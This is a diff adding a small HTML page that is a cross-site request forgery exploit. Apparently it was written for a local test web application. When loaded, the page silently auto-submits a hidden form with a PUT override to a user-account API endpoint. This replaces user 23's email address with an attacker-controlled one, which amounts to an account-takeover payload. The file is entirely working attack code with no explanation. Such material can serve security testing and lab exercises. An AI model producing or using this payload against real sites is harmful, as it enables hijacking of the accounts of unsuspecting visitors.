@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body onload="document.forms[0].submit()">
+
+<form action="http://10.0.2.15:3000/api/Users/23" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="hidden" name="_method" value="PUT">
+</form>
+
+</body>
+</html>
